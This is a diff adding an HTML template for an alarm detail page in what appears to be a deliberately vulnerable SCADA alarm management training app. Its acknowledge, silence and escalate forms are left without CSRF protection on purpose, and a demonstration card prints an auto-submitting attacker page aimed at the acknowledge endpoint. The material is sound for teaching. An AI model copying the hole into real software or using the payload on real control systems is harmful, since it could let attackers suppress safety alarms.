@@ -1,0 +1,138 @@
+{% extends "base.html" %}
+
+{% block title %}Alarm #{{ alarm.id }} - SCADA Alarm Management{% endblock %}
+
+{% block content %}
+<div class="card">
+    <a href="{{ url_for('alarms') }}" style="color: #667eea; text-decoration: none; margin-bottom: 1rem; display: inline-block;">← Back to Alarms</a>
+    
+    <h2>Alarm Details #{{ alarm.id }}</h2>
+    
+    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 2rem; margin: 2rem 0;">
+        <div>
+            <p style="margin-bottom: 0.5rem;"><strong>Alarm Code:</strong> {{ alarm.alarm_code }}</p>
+            <p style="margin-bottom: 0.5rem;"><strong>Severity:</strong> <span class="badge badge-{{ alarm.severity }}">{{ alarm.severity|upper }}</span></p>
+            <p style="margin-bottom: 0.5rem;"><strong>Description:</strong> {{ alarm.description }}</p>
+            <p style="margin-bottom: 0.5rem;"><strong>Location:</strong> {{ alarm.location }}</p>
+        </div>
+        <div>
+            <p style="margin-bottom: 0.5rem;"><strong>Triggered At:</strong> {{ alarm.triggered_at }}</p>
+            <p style="margin-bottom: 0.5rem;"><strong>Status:</strong> {{ alarm.status }}</p>
+            <p style="margin-bottom: 0.5rem;"><strong>Acknowledged:</strong> 
+                {% if alarm.acknowledged %}
+                    ✅ Yes (by {{ alarm.acknowledged_by }} at {{ alarm.acknowledged_at }})
+                {% else %}
+                    ❌ No
+                {% endif %}
+            </p>
+            <p style="margin-bottom: 0.5rem;"><strong>Silenced:</strong> 
+                {% if alarm.silenced %}
+                    🔇 Yes (until {{ alarm.silenced_until }})
+                {% else %}
+                    No
+                {% endif %}
+            </p>
+            <p style="margin-bottom: 0.5rem;"><strong>Escalated:</strong> 
+                {% if alarm.escalated %}
+                    ⬆️ Yes (to {{ alarm.escalated_to }})
+                {% else %}
+                    No
+                {% endif %}
+            </p>
+        </div>
+    </div>
+    
+    <hr style="margin: 2rem 0; border: none; border-top: 1px solid #eee;">
+    
+    <h3 style="color: #667eea; margin-bottom: 1rem;">Actions</h3>
+    
+    <div style="display: flex; gap: 1rem; flex-wrap: wrap; margin-bottom: 2rem;">
+        <!-- VULNERABILITY: No CSRF protection on these forms -->
+        {% if not alarm.acknowledged %}
+        <form method="POST" action="{{ url_for('acknowledge_alarm', alarm_id=alarm.id) }}" style="display: inline;">
+            <button type="submit" class="btn btn-success">✅ Acknowledge Alarm</button>
+        </form>
+        {% endif %}
+        
+        {% if not alarm.silenced %}
+        <form method="POST" action="{{ url_for('silence_alarm', alarm_id=alarm.id) }}" style="display: inline;">
+            <select name="duration" style="padding: 0.7rem; border: 1px solid #ddd; border-radius: 5px;">
+                <option value="30">30 minutes</option>
+                <option value="60">1 hour</option>
+                <option value="120">2 hours</option>
+                <option value="240">4 hours</option>
+            </select>
+            <button type="submit" class="btn btn-warning">🔇 Silence Alarm</button>
+        </form>
+        {% endif %}
+        
+        {% if not alarm.escalated %}
+        <form method="POST" action="{{ url_for('escalate_alarm', alarm_id=alarm.id) }}" style="display: inline;">
+            <input type="text" name="supervisor" placeholder="Supervisor name" required 
+                   style="padding: 0.7rem; border: 1px solid #ddd; border-radius: 5px;">
+            <button type="submit" class="btn btn-danger">⬆️ Escalate to Supervisor</button>
+        </form>
+        {% endif %}
+    </div>
+</div>
+
+<div class="card">
+    <h2>Alarm History</h2>
+    
+    {% if logs %}
+    <table>
+        <thead>
+            <tr>
+                <th>Timestamp</th>
+                <th>Action</th>
+                <th>Performed By</th>
+                <th>Details</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for log in logs %}
+            <tr>
+                <td>{{ log.timestamp }}</td>
+                <td><strong>{{ log.action }}</strong></td>
+                <td>{{ log.performed_by }}</td>
+                <td>{{ log.details }}</td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+    {% else %}
+    <p style="text-align: center; color: #666; padding: 2rem;">No history available</p>
+    {% endif %}
+</div>
+
+<!-- CSRF Attack Demo -->
+<div class="card" style="background: #fff3cd; border: 2px solid #ffc107;">
+    <h3 style="color: #856404;">⚠️ VULNERABILITY DEMONSTRATION</h3>
+    <p style="color: #856404; margin-top: 1rem;">
+        <strong>CSRF Vulnerability:</strong> This page has no CSRF protection. An attacker can create a malicious 
+        webpage that automatically acknowledges, silences, or escalates alarms when visited by an authenticated user.
+    </p>
+    <details style="margin-top: 1rem;">
+        <summary style="cursor: pointer; color: #667eea; font-weight: bold;">Show Example Attack Code</summary>
+        <pre style="background: #f8f9fa; padding: 1rem; border-radius: 5px; margin-top: 1rem; overflow-x: auto;">
+&lt;!-- Attacker's malicious page --&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h1&gt;Free SCADA Security Tool&lt;/h1&gt;
+    &lt;p&gt;Loading...&lt;/p&gt;
+    
+    &lt;!-- Hidden form that auto-submits --&gt;
+    &lt;form id="csrf-attack" method="POST" 
+          action="http://scada-server:5000/acknowledge/{{ alarm.id }}"&gt;
+    &lt;/form&gt;
+    
+    &lt;script&gt;
+        // Automatically submit when page loads
+        document.getElementById('csrf-attack').submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+        </pre>
+    </details>
+</div>
+{% endblock %}
